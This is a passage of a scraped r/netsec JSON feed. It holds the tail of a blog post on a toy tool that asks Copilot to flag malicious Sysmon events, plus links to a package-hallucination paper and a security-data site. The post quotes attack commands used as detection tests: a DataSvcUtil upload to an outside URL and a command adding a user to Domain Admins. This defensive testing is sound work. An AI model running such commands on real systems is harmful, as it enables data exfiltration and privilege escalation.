but increases the speed of delivery, especially in cases where several events are generated within a short time-frame.\n        </p><p>\n          The tool also accepts a conversation ID and a list of comma separated event IDs as optional arguments. The conversation ID allows to re-use an existing Copilot conversation, rather that starting a new one. The event IDs argument allows to only inspect specific events. Sysmon events range from 1 to 31.\n        </p><p>\n          The prompt used to query Copilot is:\n        </p><div><figure><pre><code data-lang=\"console\"></code></pre></figure></div><p>\n          The reason I asked to disregard DNS lookups is due to the fact that Copilot flagged several online advertisement domains as potentially malicious. For example, while browsing news websites, Copilot started responding with \"ALERT\" for events related to DNS lookups of these advertisement domains. I tried to edit to prompt to instruct to raise alerts for these domains only if absolutely certain, but it did not improve the results.\n        </p><p>\n          Finally, the tool disregards all events generated by the EDV itself, by using this simple regex against the Sysmon raw XML event:\n        </p><div><figure><pre><code data-lang=\"c#\"></code></pre></figure></div><p>\n           The tests were performed with Windows Defender enabled. Some of the commands were detected by Defender, which resulted in no event being saved in the Sysmon logs.\n        </p><p>\n          Events of the same kind, especially related to process creation, were not always flagged as malicious, which indicates that Copilot might inspect previous events before deciding to flag or not a certain event. For example, this command (from LOLBAS) <code>DataSvcUtil /out:C:\\Windows\\Temp\\data.log /uri:https://www.program-api.org/v1/upload</code> was not consistently flagged as malicious.\n        </p><p>\n          For events not blocked by Defender, Copilot was able to mark around 40% of the LOLBAS tested as malicious. Common actions, such as adding a domain user to the Domain Admins group (<code>net group \"Domain Admins\" legit /add /domain</code>) were flagged as well. Below is an example of the Defender Real-time protection disable action which Copilot flagged.\n        </p>\n        For more examples, refer to the video below.\n        <p>\n          Even though several false positives and negatives were observed during the testing, the results indicate that for some specific events, Copilot was better as flagging potential malicious actions that were not caught by Windows Defender.\n        </p><p>\n          Note: The tool is not intended for actual use — just vibes!\n        </p>","contentLength":5671,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jypjxk/edv_endpoint_detection_vibes_from_vibe_coding_to/"},{"title":"We Have a Package for You! A Comprehensive Analysis of Package Hallucinations by Code Generating LLMs","url":"https://arxiv.org/pdf/2406.10279","date":1744579531,"author":"/u/ScottContini","guid":22703,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jyihpn/we_have_a_package_for_you_a_comprehensive/"},{"title":"Consolidated View of Security Data: CVEs, Breaches, Ransomware & EOL Tracking","url":"https://cybermonit.com/","date":1744565812,"author":"/u/Electrical-Wish-4221","guid":22681,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jyd734/consolidated_view_of_security_data_cves_breaches/"}],"tags":["netsec"]}